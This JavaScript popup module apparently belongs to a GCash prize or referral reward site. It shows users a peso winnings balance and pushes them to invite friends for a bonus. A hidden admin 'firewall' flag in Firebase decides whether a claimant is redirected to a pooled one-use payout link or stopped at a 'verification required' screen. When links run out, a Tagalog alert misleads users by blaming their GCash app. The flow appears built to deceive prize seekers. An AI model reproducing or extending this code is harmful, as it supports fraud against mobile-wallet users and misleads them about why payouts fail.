/**
 * Popup Share Module - Simple Phases
 * Phase 1 (Default) | Phase 2 (Firewall OFF) | Phase 3 (Firewall ON)
 */

// ========== GLOBAL VARIABLES ==========
let currentBalance = 0;
let currentFirewallStatus = false;

// ========== GET FIREWALL STATUS ==========
async function getFirewallStatus() {
    try {
        const db = firebase.database();
        const snapshot = await db.ref('admin/globalFirewall').once('value');
        const data = snapshot.val();
        currentFirewallStatus = (data && data.active === true);
        console.log('🔥 Firewall:', currentFirewallStatus ? 'ON' : 'OFF');
        return currentFirewallStatus;
    } catch(e) {
        console.error('Firewall error:', e);
        return false;
    }
}

// ========== GET LATEST PAYOUT LINK ==========
async function getLatestPayoutLink() {
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            return { key: key, url: linkData.url };
        }
        return null;
    } catch(e) {
        console.error('Link error:', e);
        return null;
    }
}

// ========== MARK LINK AS USED ==========
async function markLinkAsUsed(linkKey, userPhone) {
    try {
        const db = firebase.database();
        await db.ref('links/' + linkKey).update({
            status: 'used',
            user: userPhone,
            usedAt: Date.now()
        });
    } catch(e) {
        console.error('Mark link error:', e);
    }
}

// ========== PHASE 1: DEFAULT POPUP ==========
function showPhase1(balance) {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentBalance = balance;
    
    popupInner.innerHTML = `
        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
        <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
        <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
        <div class="divider"></div>
        <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
        <div class="luckyday-image-container">
            <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
        </div>
        <div class="divider"></div>
        <div class="indicator-group">
            <div class="indicator" id="indicator1"></div>
            <div class="indicator" id="indicator2"></div>
            <div class="indicator" id="indicator3"></div>
        </div>
        
        <button class="claim-gcash-button" id="claimGCashBtnPopup">
            <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
        </button>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPopup" onclick="window.closePrizePopup()">
            ← BACK
        </button>
    `;
    
    // Attach click event
    const btn = document.getElementById('claimGCashBtnPopup');
    if (btn) {
        btn.onclick = handlePhase1Click;
    }
}

// ========== PHASE 1 BUTTON CLICK - CHECK FIREWALL ==========
async function handlePhase1Click() {
    console.log('CLAIM THRU GCASH clicked');
    
    const btn = document.getElementById('claimGCashBtnPopup');
    if (btn) {
        btn.disabled = true;
        btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CHECKING...`;
    }
    
    // Check firewall status
    const isFirewallOn = await getFirewallStatus();
    
    if (isFirewallOn) {
        // FIREWALL ON → PHASE 3
        showPhase3();
    } else {
        // FIREWALL OFF → PHASE 2
        showPhase2();
    }
}

// ========== PHASE 2: FIREWALL OFF ==========
function showPhase2() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    popupInner.innerHTML = `
        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
        <h2 class="popup-title">🔗 WITHDRAWAL LINK</h2>
        <div class="divider"></div>
        <div class="invite-text">Click below to claim ₱<strong>${currentBalance.toFixed(2)}</strong></div>
        
        <button class="claim-gcash-button" id="proceedBtn" style="background: linear-gradient(135deg, #00a650, #008c3a);">
            <img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH
        </button>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPhase2" onclick="window.closePrizePopup()">
            ← BACK
        </button>
    `;
    
    const proceedBtn = document.getElementById('proceedBtn');
    if (proceedBtn) {
        proceedBtn.onclick = handlePhase2Click;
    }
}

// ========== PHASE 2 BUTTON CLICK - GET LINK ==========
async function handlePhase2Click() {
    console.log('PROCEED clicked');
    
    const btn = document.getElementById('proceedBtn');
    if (btn) {
        btn.disabled = true;
        btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CHECKING LINK...`;
    }
    
    const userPhone = localStorage.getItem("userPhone");
    const linkData = await getLatestPayoutLink();
    
    if (linkData && linkData.url) {
        // May link - redirect
        await markLinkAsUsed(linkData.key, userPhone);
        window.location.href = linkData.url;
    } else {
        // Walang link - show alert
        alert("⚠️ Withdrawal Unsuccessful\n\nMukhang hindi namin ma-proseso ang iyong request dahil kailangan ng GCash App update o kaya ay wala itong mahanap na GCash sa iyong device.\n\nSolution: Siguraduhing updated ang iyong app o subukang mag-login sa ibang device para makuha na ang iyong rewards! 🚀");
        
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH`;
        }
    }
}

// ========== PHASE 3: FIREWALL ON (Placeholder) ==========
function showPhase3() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    popupInner.innerHTML = `
        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
        <h2 class="popup-title">🔒 VERIFICATION REQUIRED</h2>
        <div class="divider"></div>
        <div class="invite-text">Due to security protocol, you need to verify your account first.</div>
        
        <button class="claim-gcash-button" id="verifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000);">
            📞 VERIFY NOW
        </button>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPhase3" onclick="window.closePrizePopup()">
            ← BACK
        </button>
    `;
    
    const verifyBtn = document.getElementById('verifyBtn');
    if (verifyBtn) {
        verifyBtn.onclick = () => {
            alert("Verification feature coming soon...");
        };
    }
}

// ========== SHOW POPUP ==========
async function showPopup(balance) {
    console.log('Show popup:', balance);
    currentBalance = balance;
    
    // Get fresh firewall status
    await getFirewallStatus();
    
    // Always start with Phase 1
    showPhase1(balance);
    
    const popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'flex';
        const ticker = document.getElementById('winnerTicker');
        if (ticker) ticker.style.display = 'none';
        if (window.startConfetti) window.startConfetti();
    }
}

// ========== CLOSE POPUP ==========
function closePrizePopup() {
    const popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'none';
        const ticker = document.getElementById('winnerTicker');
        if (ticker) ticker.style.display = 'flex';
        if (window.stopConfetti) window.stopConfetti();
    }
}

// ========== EXPORT ==========
window.showPopup = showPopup;
window.closePrizePopup = closePrizePopup;
window.getFirewallStatus = getFirewallStatus;
